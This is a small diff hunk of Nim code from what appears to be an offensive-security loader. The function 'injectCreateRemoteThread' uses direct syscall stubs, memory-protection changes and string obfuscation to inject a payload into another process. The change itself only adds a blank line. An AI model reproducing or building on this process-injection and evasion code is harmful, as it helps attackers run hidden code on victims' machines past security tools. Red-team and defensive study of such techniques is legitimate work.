@@ -532,6 +532,7 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
         success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
     else:
         success = VirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
+
     if (success):
       echo obf("set back old protect")
     echo success
